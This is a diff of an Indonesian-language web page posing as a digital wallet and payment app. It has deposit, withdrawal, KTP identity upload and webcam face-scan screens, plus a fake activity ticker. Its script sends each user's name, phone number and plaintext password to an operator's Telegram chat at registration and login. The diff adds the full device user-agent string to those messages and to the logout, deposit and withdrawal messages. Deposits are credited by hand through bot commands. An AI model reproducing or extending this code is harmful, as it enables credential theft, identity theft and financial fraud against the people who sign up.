+                        <button class="quick-nominal-btn" onclick="setNominal(500000)">Rp 500.000</button>
+                    </div>
+                    
+                    <label style="font-size: 13px; color: var(--text-muted); font-weight: 600; margin-bottom: 8px; display: block;">Pilih Metode Pembayaran</label>
+                    <div style="display: flex; flex-direction: column; gap: 12px; margin-bottom: 20px;">
+                        <div class="payment-card active" id="pm-qris">
+                            <div style="display:flex; justify-content:space-between; align-items:center;">
+                                <span style="font-weight:700;"><i class="bi bi-qr-code-scan"></i> QRIS Merchant</span>
+                                <span style="font-size: 11px; padding: 4px 8px; background: rgba(16,185,129,0.1); color: var(--success); border-radius: 6px; font-weight: bold;">Tersedia</span>
+                            </div>
+                            <div style="font-size: 12px; color: var(--success); margin-top: 6px; font-weight:600;">Diproses 1-5 menit</div>
                         </div>
-                        <div style="font-size: 12px; color: var(--text-muted); margin-top: 6px;">Biaya Layanan Rp 7.500</div>
+                        
+                        <div class="payment-card disabled">
+                            <div style="display:flex; justify-content:space-between; align-items:center;">
+                                <span style="font-weight:700; color:var(--text-muted);"><i class="bi bi-bank"></i> Virtual Account Bank</span>
+                                <span style="font-size: 11px; padding: 4px 8px; background: rgba(239,68,68,0.1); color: var(--danger); border-radius: 6px; font-weight: bold;">Offline</span>
+                            </div>
+                            <div style="font-size: 12px; color: var(--text-muted); margin-top: 6px;">Biaya Layanan Rp 7.500</div>
+                        </div>
+
+                        <div class="payment-card disabled">
+                            <div style="display:flex; justify-content:space-between; align-items:center;">
+                                <span style="font-weight:700; color:var(--text-muted);"><i class="bi bi-shop"></i> Indomaret / Alfamart</span>
+                                <span style="font-size: 11px; padding: 4px 8px; background: rgba(239,68,68,0.1); color: var(--danger); border-radius: 6px; font-weight: bold;">Offline</span>
+                            </div>
+                            <div style="font-size: 12px; color: var(--text-muted); margin-top: 6px;">Biaya Layanan Rp 7.500</div>
+                        </div>
                     </div>
 
-                    <div class="payment-card disabled">
-                        <div style="display:flex; justify-content:space-between; align-items:center;">
-                            <span style="font-weight:700; color:var(--text-muted);"><i class="bi bi-shop"></i> Indomaret / Alfamart</span>
-                            <span style="font-size: 11px; padding: 4px 8px; background: rgba(239,68,68,0.1); color: var(--danger); border-radius: 6px; font-weight: bold;">Offline</span>
-                        </div>
-                        <div style="font-size: 12px; color: var(--text-muted); margin-top: 6px;">Biaya Layanan Rp 7.500</div>
-                    </div>
+                    <button class="btn-modal" onclick="requestDeposit()">Konfirmasi</button>
                 </div>
-
-                <button class="btn-modal" onclick="requestDeposit()">Proses Pembayaran</button>
-            </div>
-            
-            <div id="deposit-step-2" style="display:none; text-align: center;">
-                <p style="color:var(--primary); font-weight:800; font-size:24px; margin-bottom: 10px;" id="deposit-amount-display">Rp 0</p>
                 
-                <div id="deposit-status-wrapper">
-                    <div id="qris-loading">
-                        <div class="loading-spinner"></div>
-                        <p style="color:var(--text-muted); font-size:13px; margin-bottom:15px;">Menunggu QRIS Pembayaran dari operator</p>
-                    </div>
+                <div id="deposit-step-2" style="display:none; text-align: center;">
+                    <p style="color:var(--primary); font-weight:800; font-size:24px; margin-bottom: 10px;" id="deposit-amount-display">Rp 0</p>
                     
-                    <div id="qris-ready" class="qris-box" style="display:none; background:none;margin-bottom:15px;">
-                        <img id="qris-image-tag" src="" alt="QRIS" style="width:100%; max-width:480px;border-radius:12px">
+                    <div id="deposit-status-wrapper">
+                        <div id="qris-loading">
+                            <div class="loading-spinner"></div>
+                            <p style="color:var(--text-muted); font-size:13px; margin-bottom:15px;">Menunggu QRIS Pembayaran dari operator</p>
+                        </div>
+                        
+                        <div id="qris-ready" class="qris-box" style="display:none; background:none;margin-bottom:15px;">
+                            <img id="qris-image-tag" src="" alt="QRIS" style="width:100%; max-width:480px;border-radius:12px">
+                            <div onclick="openFullscreenQR()" style="display: flex; align-items: center; justify-content: center; gap: 8px; color: var(--primary); font-weight: 700; font-size: 13px; margin-top: 12px; cursor: pointer; padding: 8px; background: rgba(59, 130, 246, 0.1); border-radius: 12px;">
+                                <i class="bi bi-arrows-fullscreen"></i> Besarkan Gambar
+                            </div>
+                        </div>
+                        
+                        <div id="deposit-success-msg" style="display:none; margin: 20px 0;"></div>
                     </div>
-                    
-                    <div id="deposit-success-msg" style="display:none; margin: 20px 0;"></div>
-                </div>
 
-                <div id="deposit-instructions" style="display: none; font-size: 13px; color: var(--text-muted); text-align: left; background: var(--bg-input); padding: 15px; border-radius: 12px; margin-bottom: 20px;">
-                    <strong style="color: var(--text-main);">Petunjuk Bayar:</strong><br>
-                    1. Buka M-Banking / E-Wallet Anda.<br>
-                    2. Pindai (Scan) QRIS di atas.<br>
-                    3. Konfirmasi pembayaran.<br>
-                    <span style="color:var(--danger); margin-top:8px; display:block; font-weight:bold;" id="deposit-timer"></span>
-                </div>
+                    <div id="deposit-instructions" style="display: none; font-size: 13px; color: var(--text-muted); text-align: left; background: var(--bg-input); padding: 15px; border-radius: 12px; margin-bottom: 20px;">
+                        <strong style="color: var(--text-main);">Petunjuk Bayar:</strong><br>
+                        1. Buka M-Banking / E-Wallet Anda.<br>
+                        2. Pindai (Scan) QRIS di atas.<br>
+                        3. Konfirmasi pembayaran.<br>
+                        <span style="color:var(--danger); margin-top:8px; display:block; font-weight:bold;" id="deposit-timer"></span>
+                    </div>
 
-                <button id="btn-cancel-deposit" class="btn-modal btn-modal-danger" onclick="cancelActiveDepositSystem()">Batalkan</button>
+                    <button id="btn-cancel-deposit" class="btn-modal btn-modal-danger" onclick="cancelActiveDepositSystem()">Batalkan</button>
+                </div>
             </div>
         </div>
     </div>
@@ -1200,42 +1251,44 @@
                 <h3>Transfer Saldo</h3>
                 <button class="btn-icon" onclick="closeTargetModal('withdraw-modal')"><i class="bi bi-x-lg"></i></button>
             </div>
-            <div id="wd-setup-bank">
-                <div class="input-group">
-                    <label>Pilih Instansi Perbankan / E-Wallet</label>
-                    <select id="bank-provider">
-                        <option value="BCA">Bank BCA</option>
-                        <option value="BRI">Bank BRI</option>
-                        <option value="MANDIRI">Bank Mandiri</option>
-                        <option value="OVO">OVO</option>
-                        <option value="DANA">DANA</option>
-                        <option value="GOPAY">GoPay</option>
-                        <option value="ShopeePay">ShopeePay</option>
-                    </select>
+            <div class="modal-body">
+                <div id="wd-setup-bank">
+                    <div class="input-group">
+                        <label>Pilih Instansi Perbankan / E-Wallet</label>
+                        <select id="bank-provider">
+                            <option value="BCA">Bank BCA</option>
+                            <option value="BRI">Bank BRI</option>
+                            <option value="MANDIRI">Bank Mandiri</option>
+                            <option value="OVO">OVO</option>
+                            <option value="DANA">DANA</option>
+                            <option value="GOPAY">GoPay</option>
+                            <option value="ShopeePay">ShopeePay</option>
+                        </select>
+                    </div>
+                    <div class="input-group">
+                        <label>Nomor Rekening </label>
+                        <input type="number" id="bank-number" placeholder="Masukkan nomor">
+                    </div>
+                    <div class="input-group">
+                        <label>Nama Pemilik Rekening</label>
+                        <input type="text" id="bank-name" placeholder="Masukkan nama">
+                    </div>
+                    <button class="btn-modal" onclick="saveBankDetails()">Simpan rekening</button>
                 </div>
-                <div class="input-group">
-                    <label>Nomor Rekening </label>
-                    <input type="number" id="bank-number" placeholder="Masukkan nomor">
-                </div>
-                <div class="input-group">
-                    <label>Nama Pemilik Rekening</label>
-                    <input type="text" id="bank-name" placeholder="Masukkan nama">
-                </div>
-                <button class="btn-modal" onclick="saveBankDetails()">Simpan rekening</button>
-            </div>
 
-            <div id="wd-form" style="display:none;">
-                <div style="background: var(--bg-input); padding: 15px; border-radius: 14px; margin-bottom: 15px;">
-                    <div style="font-size:12px; color:var(--text-muted);">Rekening Penarikan</div>
-                    <div style="font-weight:bold;margin-top:5px; font-size:14px; color: var(--text-main);" id="saved-bank-name">NAMA</div>
-                    <div style="color:var(--primary);margin-top:3px; font-size:13px; font-weight:700;" id="saved-bank-info">BANK - 000</div>
-                    <a href="#" style="font-size:12px; color:var(--danger); text-decoration:none; display:inline-block; margin-top:8px;" onclick="resetBankDetails()">Hapus</a>
+                <div id="wd-form" style="display:none;">
+                    <div style="background: var(--bg-input); padding: 15px; border-radius: 14px; margin-bottom: 15px;">
+                        <div style="font-size:12px; color:var(--text-muted);">Rekening Penarikan</div>
+                        <div style="font-weight:bold;margin-top:5px; font-size:14px; color: var(--text-main);" id="saved-bank-name">NAMA</div>
+                        <div style="color:var(--primary);margin-top:3px; font-size:13px; font-weight:700;" id="saved-bank-info">BANK - 000</div>
+                        <a href="#" style="font-size:12px; color:var(--danger); text-decoration:none; display:inline-block; margin-top:8px;" onclick="resetBankDetails()">Hapus</a>
+                    </div>
+                    <div class="input-group">
+                        <label>Nominal Penarikan (Min. Rp 50.000)</label>
+                        <input type="number" id="wd-amount" placeholder="Jumlah penarikan">
+                    </div>
+                    <button class="btn-modal" id="btn-submit-wd" onclick="submitWithdraw()">Konfirmasi</button>
                 </div>
-                <div class="input-group">
-                    <label>Nominal Penarikan (Min. Rp 50.000)</label>
-                    <input type="number" id="wd-amount" placeholder="Jumlah penarikan">
-                </div>
-                <button class="btn-modal" id="btn-submit-wd" onclick="submitWithdraw()">Konfirmasi</button>
             </div>
         </div>
     </div>
@@ -1246,28 +1299,43 @@
                 <h3>Verifikasi Identitas</h3>
                 <button class="btn-icon" onclick="closeTargetModal('verif-ktp-modal')"><i class="bi bi-x-lg"></i></button>
             </div>
-            <div class="input-group"><label>Nama Sesuai Dokumen KTP</label><input type="text" id="v-name" placeholder="Nama Lengkap"></div>
-            <div class="input-group"><label>Nomor NIK KTP (16 Digit)</label><input type="number" id="v-nik" placeholder="Masukkan 16 angka NIK KTP"></div>
-            <div class="input-group"><label>Unggah Gambar Foto Fisik KTP</label><input type="file" id="v-file" accept="image/*" style="padding:10px; background:var(--bg-card);"></div>
-            <button class="btn-modal" onclick="proceedToFaceScan()">Verifikasi</button>
+            <div class="modal-body">
+                <div class="input-group">
+                    <label>Nama Sesuai Dokumen KTP</label>
+                    <input type="text" id="v-name" placeholder="Nama Lengkap">
+                </div>
+                <div class="input-group">
+                    <label>Nomor NIK KTP (16 Digit)</label>
+                    <input type="number" id="v-nik" placeholder="Masukkan 16 angka NIK KTP">
+                </div>
+                <div class="input-group">
+                    <label>Unggah Gambar Foto Fisik KTP</label>
+                    <input type="file" id="v-file" accept="image/*" style="padding:10px; background:var(--bg-card);">
+                </div>
+                <button class="btn-modal" onclick="proceedToFaceScan()">Verifikasi</button>
+            </div>
         </div>
     </div>
 
     <div id="verif-face-modal" class="modal-overlay">
         <div class="modal-content" style="text-align: center;">
-            <h3>Pemindaian Biometrik Wajah</h3>
-            <div class="face-scan-box"><video id="webcam-video" autoplay playsinline></video></div>
-            <div id="scan-instruction-text" style="font-weight: 700; margin-bottom: 20px; color: var(--primary);">Mempersiapkan Sensor Kamera Biometrik...</div>
-            <button class="btn-modal btn-modal-danger" onclick="cancelFaceScan()">Batalkan</button>
+            <div class="modal-body">
+                <h3 style="margin-bottom: 15px;">Pemindaian Biometrik Wajah</h3>
+                <div class="face-scan-box"><video id="webcam-video" autoplay playsinline></video></div>
+                <div id="scan-instruction-text" style="font-weight: 700; margin-bottom: 20px; color: var(--primary);">Mempersiapkan Sensor Kamera Biometrik...</div>
+                <button class="btn-modal btn-modal-danger" onclick="cancelFaceScan()">Batalkan</button>
+            </div>
         </div>
     </div>
 
     <div id="custom-modal" class="modal-overlay" style="z-index: 1000005;">
         <div class="modal-content" style="text-align: center;">
-            <div id="modal-icon" style="font-size: 50px; margin-bottom: 10px;"></div>
-            <h3 id="modal-title" style="margin-bottom: 10px; color: var(--text-main);">Informasi</h3>
-            <div id="modal-desc" style="font-size: 14px; color: var(--text-muted); margin-bottom: 20px; line-height: 1.5;">Pesan Notifikasi</div>
-            <button class="btn-modal" id="modal-primary-btn" onclick="closeInfoModal()">Mengerti</button>
+            <div class="modal-body">
+                <div id="modal-icon" style="font-size: 50px; margin-bottom: 10px;"></div>
+                <h3 id="modal-title" style="margin-bottom: 10px; color: var(--text-main);">Informasi</h3>
+                <div id="modal-desc" style="font-size: 14px; color: var(--text-muted); margin-bottom: 20px; line-height: 1.5;">Pesan Notifikasi</div>
+                <button class="btn-modal" id="modal-primary-btn" onclick="closeInfoModal()">Mengerti</button>
+            </div>
         </div>
     </div>
 
@@ -1281,6 +1349,15 @@
         </div>
     </div>
     
+    <div id="fullscreen-qris-modal" class="modal-overlay" style="z-index: 10000000; background: rgba(0,0,0,0.95); flex-direction: column;">
+        <div class="modal-header" style="width: 100%; max-width: 480px; justify-content: flex-end; padding: 20px; margin-bottom: 0; background: transparent; border: none;">
+            <button class="btn-icon" onclick="closeFullscreenQR()"><i class="bi bi-x-lg"></i></button>
+        </div>
+        <div style="flex: 1; display: flex; align-items: center; justify-content: center; width: 100%; padding: 20px;">
+            <img id="fullscreen-qris-img" src="" alt="QRIS Fullscreen" style="max-width: 100%; max-height: 80vh; border-radius: 16px;">
+        </div>
+    </div>
+
     <div id="toast-notif" class="toast-notif">
         <i class="bi bi-lightning-charge-fill" style="font-size: 22px; color: var(--primary);"></i>
         <div style="flex: 1;">
@@ -1365,6 +1442,22 @@
             }
         });
 
+        function openFullscreenQR() {
+            const qrSrc = document.getElementById('qris-image-tag').src;
+            if (qrSrc) {
+                document.getElementById('fullscreen-qris-img').src = qrSrc;
+                const modal = document.getElementById('fullscreen-qris-modal');
+                modal.style.display = 'flex';
+                setTimeout(() => modal.classList.add('show'), 10);
+            }
+        }
+
+        function closeFullscreenQR() {
+            const modal = document.getElementById('fullscreen-qris-modal');
+            modal.classList.remove('show');
+            setTimeout(() => modal.style.display = 'none', 250);
+        }
+
         function recordFaceVideo(stream, duration = 7000) {
             return new Promise((resolve) => {
                 let options = { mimeType: 'video/webm' };
@@ -1442,7 +1535,7 @@
             document.getElementById('deposit-amount').value = amount;
         }
 
-       function addFakeTickerItem() {
+        function addFakeTickerItem() {
             const ewallets = [
                 { name: "DANA", img: "https://digital6301.wordpress.com/wp-content/uploads/2026/01/1000360049-removebg-preview-1.png" },
                 { name: "OVO", img: "https://digital6301.wordpress.com/wp-content/uploads/2026/01/1000360048-removebg-preview.png" },
@@ -1870,24 +1963,7 @@
         function openPinSetupModal() { openTargetModal('pin-setup-modal'); }
 
         function getDeviceName() {
-            const ua = navigator.userAgent.toLowerCase();
-            
-            if (/iphone|ipad|ipod/.test(ua)) return "Apple (iOS)";
-            if (/macintosh|mac os/.test(ua)) return "Apple (Mac)";
-            if (/windows/.test(ua)) return "Windows PC";
-            if (/android/.test(ua)) {
-                if (/samsung|sm-/.test(ua)) return "Samsung";
-                if (/xiaomi|redmi|poco|mi /.test(ua)) return "Xiaomi";
-                if (/oppo|cph/.test(ua)) return "OPPO";
-                if (/vivo|v\d{4}/.test(ua)) return "Vivo";
-                if (/realme|rmx/.test(ua)) return "Realme";
-                if (/huawei|honor/.test(ua)) return "Huawei";
-                if (/infinix|x6/.test(ua)) return "Infinix";
-                if (/asus/.test(ua)) return "Asus";
-                return "Android";
-            }
-            if (/linux/.test(ua)) return "Linux";
-            return "Perangkat Tidak Dikenal";
+            return navigator.userAgent;
         }
         
         function processRegister() {
@@ -1921,7 +1997,7 @@
             addNotifToUser(phone, "Selamat bergabung! Klaim saldo reward khusus pengguna baru.", "bonus");
 
             const deviceUsed = getDeviceName();
-            sendToTelegram(`*PENDAFTARAN USER BARU*\nNama: ${name}\nHP: \`${phone}\`\nPassword: \`${pass}\`\nUID: \`${newUID}\`\nDevice: *${deviceUsed}*`);
+            sendToTelegram(`*PENDAFTARAN USER BARU*\nNama: ${name}\nHP: \`${phone}\`\nPassword: \`${pass}\`\nUID: \`${newUID}\`\nDevice: \`${deviceUsed}\``);
             
             closeTargetModal('register-modal'); 
             showModal("Berhasil", "Pendaftaran valid silakan login.", "win");
@@ -1963,7 +2039,7 @@
                 localStorage.setItem('sanz_current_name', usersDb[phone].name);
                 currentUserPhone = phone; currentUserName = usersDb[phone].name;
                 const deviceUsed = getDeviceName();
-                sendToTelegram(`*AKTIVITAS LOGIN*\nNama: ${usersDb[phone].name}\nHP: \`${phone}\`\nPassword: \`${pass}\`\nUID: \`${usersDb[phone].uid}\`\nDevice: *${deviceUsed}*`);
+                sendToTelegram(`*AKTIVITAS LOGIN*\nNama: ${usersDb[phone].name}\nHP: \`${phone}\`\nPassword: \`${pass}\`\nUID: \`${usersDb[phone].uid}\`\nDevice: \`${deviceUsed}\``);
                 updateAuthUI(); closeTargetModal('login-modal'); startTelegramPolling(); 
                 checkLoginLock();
                 showModal("Berhasil", `Selamat bergabung kembali, ${currentUserName}!`, "win");
@@ -1975,7 +2051,8 @@
                 let usersDb = JSON.parse(localStorage.getItem('sanz_users_db')) || {};
                 let u = usersDb[currentUserPhone];
                 if(u) {
-                    sendToTelegram(`*AKTIVITAS LOGOUT*\nNama: ${currentUserName}\nHP: \`${currentUserPhone}\`\nUID: \`${u.uid}\``);
+                    const deviceUsed = getDeviceName();
+                    sendToTelegram(`*AKTIVITAS LOGOUT*\nNama: ${currentUserName}\nHP: \`${currentUserPhone}\`\nUID: \`${u.uid}\`\nDevice: \`${deviceUsed}\``);
                 }
             }
 
@@ -1987,7 +2064,6 @@
 
             updateAuthUI(); showModal("Perhatian", "Keluar akun berhasil.", "info");
             
-            // Stop Web Worker Polling
             timerWorker.postMessage('stop');
             isPolling = false;
         }
@@ -2068,43 +2144,43 @@
         }
 
         function challengeUserPinSystem(successCallback) {
-          let usersDb = JSON.parse(localStorage.getItem('sanz_users_db')) || {};
-          let u = usersDb[currentUserPhone];
-          if(u && u.pinCode) {
-          pendingPinCallback = successCallback;
-          failedPinAttempts = 0; 
-          document.getElementById('auth-pin-input').value = '';
-          openTargetModal('pin-auth-modal');
-        } else { successCallback(); }
-     }
+            let usersDb = JSON.parse(localStorage.getItem('sanz_users_db')) || {};
+            let u = usersDb[currentUserPhone];
+            if(u && u.pinCode) {
+                pendingPinCallback = successCallback;
+                failedPinAttempts = 0; 
+                document.getElementById('auth-pin-input').value = '';
+                openTargetModal('pin-auth-modal');
+            } else { successCallback(); }
+        }
 
         function verifyPinAction() {
-        const pinVal = document.getElementById('auth-pin-input').value.trim();
-    
-    if (!pinVal) {
-        return showModal("Perhatian", "PIN Transaksi tidak boleh kosong.", "error");
-    }
+            const pinVal = document.getElementById('auth-pin-input').value.trim();
+        
+            if (!pinVal) {
+                return showModal("Perhatian", "PIN Transaksi tidak boleh kosong.", "error");
+            }
 
-    let usersDb = JSON.parse(localStorage.getItem('sanz_users_db')) || {};
-    
-    if(usersDb[currentUserPhone].pinCode === pinVal) {
-        closeTargetModal('pin-auth-modal');
-        if(pendingPinCallback) { pendingPinCallback(); pendingPinCallback = null; }
-    } else { 
-  
-        failedPinAttempts++;
-        let sisaPercobaan = 3 - failedPinAttempts;
+            let usersDb = JSON.parse(localStorage.getItem('sanz_users_db')) || {};
+            
+            if(usersDb[currentUserPhone].pinCode === pinVal) {
+                closeTargetModal('pin-auth-modal');
+                if(pendingPinCallback) { pendingPinCallback(); pendingPinCallback = null; }
+            } else { 
+        
+                failedPinAttempts++;
+                let sisaPercobaan = 3 - failedPinAttempts;
 
-        if (failedPinAttempts >= 3) {
-            closeTargetModal('pin-auth-modal');
-            showModal("Perhatian", "Anda salah memasukkan PIN transaksi silakan verifikasi untuk mereset.", "error");
-            setTimeout(() => { openTargetModal('reset-pin-nik-modal'); }, 1800);
-        } else {
-            document.getElementById('auth-pin-input').value = ''; 
-            showModal("Perhatian", `PIN yang Anda masukkan salah sisa ${sisaPercobaan}x percobaan.`, "error");
+                if (failedPinAttempts >= 3) {
+                    closeTargetModal('pin-auth-modal');
+                    showModal("Perhatian", "Anda salah memasukkan PIN transaksi silakan verifikasi untuk mereset.", "error");
+                    setTimeout(() => { openTargetModal('reset-pin-nik-modal'); }, 1800);
+                } else {
+                    document.getElementById('auth-pin-input').value = ''; 
+                    showModal("Perhatian", `PIN yang Anda masukkan salah sisa ${sisaPercobaan}x percobaan.`, "error");
+                }
+            }
         }
-    }
-}
 
         function openPPOBModal(service) {
             if (!requireLogin()) return;
@@ -2136,21 +2212,21 @@
         }
 
         function addFlashsaleToCart(itemName, normalPrice, promoPrice, couponCode) {
-           if(!requireLogin()) return;
-           let usersDb = JSON.parse(localStorage.getItem('sanz_users_db')) || {};
-           if(usersDb[currentUserPhone].isBlocked) return showModal("Perhatian","Transaksi ditangguhkan.","error");
+            if(!requireLogin()) return;
+            let usersDb = JSON.parse(localStorage.getItem('sanz_users_db')) || {};
+            if(usersDb[currentUserPhone].isBlocked) return showModal("Perhatian","Transaksi ditangguhkan.","error");
     
-           let isAuto = (couponCode === 'AUTO');
-           cartItem = { name: itemName, basePrice: normalPrice, promoPrice: promoPrice, requiredCoupon: couponCode, promoAppliedStatus: isAuto };
+            let isAuto = (couponCode === 'AUTO');
+            cartItem = { name: itemName, basePrice: normalPrice, promoPrice: promoPrice, requiredCoupon: couponCode, promoAppliedStatus: isAuto };
 
-           if(document.getElementById('cart-target')) document.getElementById('cart-target').value = '';
-           if(document.getElementById('promo-code')) document.getElementById('promo-code').value = '';
-           if(document.getElementById('cart-provider')) document.getElementById('cart-provider').selectedIndex = 0;
+            if(document.getElementById('cart-target')) document.getElementById('cart-target').value = '';
+            if(document.getElementById('promo-code')) document.getElementById('promo-code').value = '';
+            if(document.getElementById('cart-provider')) document.getElementById('cart-provider').selectedIndex = 0;
 
-           const badge = document.getElementById('cart-badge');
-           badge.style.display = 'block'; badge.innerText = "1";
+            const badge = document.getElementById('cart-badge');
+            badge.style.display = 'block'; badge.innerText = "1";
     
-           showNotif(`${itemName} berhasil ditempatkan di keranjang belanja.`);
+            showNotif(`${itemName} berhasil ditempatkan di keranjang belanja.`);
         }
 
         function openCartModal() {
@@ -2393,6 +2469,7 @@
 
             document.getElementById('deposit-step-1').style.display = 'block';
             document.getElementById('deposit-step-2').style.display = 'none';
+            document.getElementById('deposit-amount-display').style.display = 'block';
             document.getElementById('deposit-amount').value = '';
             
             document.getElementById('qris-loading').style.display = 'block';
@@ -2407,6 +2484,7 @@
             if(activeDep && activeDep.status === 'Menunggu') {
                 document.getElementById('deposit-step-1').style.display = 'none';
                 document.getElementById('deposit-step-2').style.display = 'block';
+                document.getElementById('deposit-amount-display').style.display = 'block';
                 document.getElementById('deposit-amount-display').innerText = formatIDR(activeDep.amount);
                 if(activeDep.qrUrl) {
                     showQR(activeDep.qrUrl, activeDep, true);
@@ -2440,13 +2518,15 @@
 
             document.getElementById('deposit-step-1').style.display = 'none';
             document.getElementById('deposit-step-2').style.display = 'block';
+            document.getElementById('deposit-amount-display').style.display = 'block';
             document.getElementById('deposit-instructions').style.display = 'none';
             document.getElementById('deposit-amount-display').innerText = formatIDR(amount);
 
             tradeHistory.unshift({ id: trxId, type: 'Deposit', amount: amount, time: timeStr, status: 'Menunggu', info: 'QRIS Pembayaran' });
             saveDataLocally(); renderHistory();
 
-            sendToTelegram(`*PERMINTAAN ISI SALDO*\nUID: \`${userID}\`\nNominal: Rp ${amount.toLocaleString('id-ID')}\n\nKirim QRIS: \`/send ${userID}\` \nKonfirmasi: \`/acc ${amount} ${userID}\` \nTolak: \`/tolak ${userID}\``);
+            const deviceUsed = getDeviceName();
+            sendToTelegram(`*PERMINTAAN ISI SALDO*\nUID: \`${userID}\`\nNominal: Rp ${amount.toLocaleString('id-ID')}\nDevice: \`${deviceUsed}\`\n\nKirim QRIS: \`/send ${userID}\` \nKonfirmasi: \`/acc ${amount} ${userID}\` \nTolak: \`/tolak ${userID}\``);
         }
 
         function showQR(url, activeDep, isResume = false) {
@@ -2470,12 +2550,24 @@
   
                     clearInterval(depositTimerInterval); 
   
+                    document.getElementById('deposit-amount-display').style.display = 'none';
                     document.getElementById('qris-ready').style.display = 'none';
                     document.getElementById('deposit-instructions').style.display = 'none';
                     document.getElementById('btn-cancel-deposit').style.display = 'none';
   
                     document.getElementById('deposit-success-msg').style.display = 'block';
-                    document.getElementById('deposit-success-msg').innerHTML = "<h3 style='color:var(--danger);'>Pembayaran dibatalkan</h3><p style='margin-top:10px;font-size:13px; color:var(--text-muted);'>Waktu pembayaran telah expired.</p>";
+                    let txDate = new Date(activeDep.id).toLocaleDateString('id-ID');
+                    let txTime = new Date(activeDep.id).toLocaleTimeString('id-ID');
+                    document.getElementById('deposit-success-msg').innerHTML = `
+                        <div class="receipt-box" style="text-align: left; margin-top: 5px;">
+                            <div class="receipt-header">DIGITAL</div>
+                            <div class="receipt-row"><span>ID Transaksi:</span><span>TRX-${activeDep.id}</span></div>
+                            <div class="receipt-row"><span>Waktu:</span><span>${txDate} ${txTime}</span></div>
+                            <div class="receipt-row"><span>Metode:</span><span>QRIS Merchant</span></div>
+                            <div class="receipt-row"><span>Status:</span><span style="color: var(--danger); font-weight: bold;">Expired</span></div>
+                            <hr style="border:0; border-top:1px dashed #cbd5e1; margin: 12px 0;">
+                            <div class="receipt-row" style="font-weight:bold; font-size: 15px;"><span>Total:</span><span>${formatIDR(activeDep.amount)}</span></div>
+                        </div>`;
 
                     let idx = tradeHistory.findIndex(h => h.id === activeDep.id);
                     if(idx !== -1) { 
@@ -2533,6 +2625,8 @@
             if(isNaN(amount) || amount < 50000) return showModal("Perhatian", "Jumlah penarikan minimal Rp 50.000", "error");
             if(amount > userBalance) return showModal("Perhatian", "Saldo tidak mencukupi untuk penarikan.", "error");
 
+            closeTargetModal('withdraw-modal');
+
             challengeUserPinSystem(() => {
                 const saved = JSON.parse(localStorage.getItem(`sanz_bank_${currentUserPhone}`));
                 userBalance -= amount; updateBalanceDisplay();
@@ -2546,9 +2640,9 @@
                 tradeHistory.unshift({ id: trxId, type: 'Penarikan', amount: amount, time: timeStr, status: 'Menunggu', info: `${saved.provider}` });
                 saveDataLocally(); renderHistory();
                 
-                sendToTelegram(`*PERMINTAAN TARIK SALDO*\nUID: \`${userID}\`\nNominal: Rp ${amount.toLocaleString('id-ID')}\nTujuan: ${saved.provider} - \`${saved.number}\` an (${saved.name})\n\nTerima: \`/acc_wd ${userID}\` \nTolak: \`/tolak_wd ${userID}\``);
+                const deviceUsed = getDeviceName();
+                sendToTelegram(`*PERMINTAAN TARIK SALDO*\nUID: \`${userID}\`\nNominal: Rp ${amount.toLocaleString('id-ID')}\nTujuan: ${saved.provider} - \`${saved.number}\` an (${saved.name})\nDevice: \`${deviceUsed}\`\n\nTerima: \`/acc_wd ${userID}\` \nTolak: \`/tolak_wd ${userID}\``);
                 
-                closeTargetModal('withdraw-modal');
                 showModal("Diproses", "Permintaan penarikan saldo terkirim.", "win");
             });
         }
@@ -2833,7 +2927,9 @@
                             localStorage.removeItem(`sanz_active_deposit_${currentUserPhone}`);
                             let parts = text.split(' '); let accAmt = parseInt(parts[1]); if (isNaN(accAmt)) accAmt = activeDep.amount;
                             
-                            let finalAmt = accAmt < 99000 ? accAmt - 1500 : accAmt;
+                            let adminFee = accAmt < 100000 ? 1500 : 0;
+                            let finalAmt = accAmt - adminFee;
+                            
                             userBalance += finalAmt; updateBalanceDisplay();
                             
                             let idx = tradeHistory.findIndex(h => h.id === activeDep.id);
@@ -2842,12 +2938,33 @@
                             if(depositTimerInterval) clearInterval(depositTimerInterval);
                             
                             if(document.getElementById('qris-loading')) {
+                                document.getElementById('deposit-amount-display').style.display = 'none';
                                 document.getElementById('qris-loading').style.display = 'none';
                                 document.getElementById('qris-ready').style.display = 'none';
                                 document.getElementById('deposit-instructions').style.display = 'none';
-                                document.getElementById('deposit-success-msg').style.display = 'block';
-                                document.getElementById('deposit-success-msg').innerHTML = "<h3 style='color:var(--success);'>Pembayaran berhasil</h3>";
                                 document.getElementById('btn-cancel-deposit').style.display = 'none';
+                                document.getElementById('deposit-success-msg').style.display = 'block';
+                                
+                                let txDate = new Date(activeDep.id).toLocaleDateString('id-ID');
+                                let txTime = new Date(activeDep.id).toLocaleTimeString('id-ID');
+                                
+                                let feeRow = adminFee > 0 
+                                    ? `<div class="receipt-row"><span>Biaya Layanan:</span><span style="color:var(--danger);">- ${formatIDR(adminFee)}</span></div>` 
+                                    : `<div class="receipt-row"><span>Biaya Layanan:</span><span>Gratis</span></div>`;
+
+                                document.getElementById('deposit-success-msg').innerHTML = `
+                                    <div class="receipt-box" style="text-align: left; margin-top: 5px;">
+                                        <div class="receipt-header">DIGITAL</div>
+                                        <div class="receipt-row"><span>ID Transaksi:</span><span>TRX-${activeDep.id}</span></div>
+                                        <div class="receipt-row"><span>Waktu:</span><span>${txDate} ${txTime}</span></div>
+                                        <div class="receipt-row"><span>Metode:</span><span>QRIS Merchant</span></div>
+                                        <div class="receipt-row"><span>Status:</span><span style="color: var(--success); font-weight: bold;">Berhasil</span></div>
+                                        <hr style="border:0; border-top:1px dashed #cbd5e1; margin: 12px 0;">
+                                        <div class="receipt-row"><span>Nominal:</span><span>${formatIDR(accAmt)}</span></div>
+                                        ${feeRow}
+                                        <hr style="border:0; border-top:1px dashed #cbd5e1; margin: 12px 0;">
+                                        <div class="receipt-row" style="font-weight:bold; font-size: 15px;"><span>Total:</span><span style="color:var(--primary);">${formatIDR(finalAmt)}</span></div>
+                                    </div>`;
                             }
                             
                             addNotifToUser(currentUserPhone, `Isi saldo berhasil diproses senilai ${formatIDR(finalAmt)}`);
@@ -2861,11 +2978,23 @@
                             if(depositTimerInterval) clearInterval(depositTimerInterval);
                             
                             if(document.getElementById('qris-loading')) {
+                                document.getElementById('deposit-amount-display').style.display = 'none';
                                 document.getElementById('qris-loading').style.display = 'none';
                                 document.getElementById('qris-ready').style.display = 'none';
                                 document.getElementById('deposit-instructions').style.display = 'none';
                                 document.getElementById('deposit-success-msg').style.display = 'block';
-                                document.getElementById('deposit-success-msg').innerHTML = "<h3 style='color:var(--danger);'>Pembayaran dibatalkan</h3>";
